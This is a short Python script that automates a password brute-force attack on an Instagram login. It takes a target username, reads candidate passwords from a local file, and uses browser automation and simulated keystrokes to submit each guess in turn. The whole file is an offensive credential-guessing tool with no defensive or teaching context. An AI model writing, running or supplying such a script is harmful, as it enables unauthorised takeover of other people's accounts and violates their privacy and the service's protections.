from webbot import browser
from pynput.keyboard import Key,Controller
import time
from selenium import webdriver


username = input("username = ")
password_list = "password_list.txt"

file = open(password_list,"r")
passwords = []
for line in file :
    line = line.strip()
    passwords.append(line)

file.close()

web = browser()
keyboard = Controller()

web.go_to("www.instagram.com")
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(2)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(2)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute_force in passwords:
    web.type(brute_force,into="password")
    time.sleep(2)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
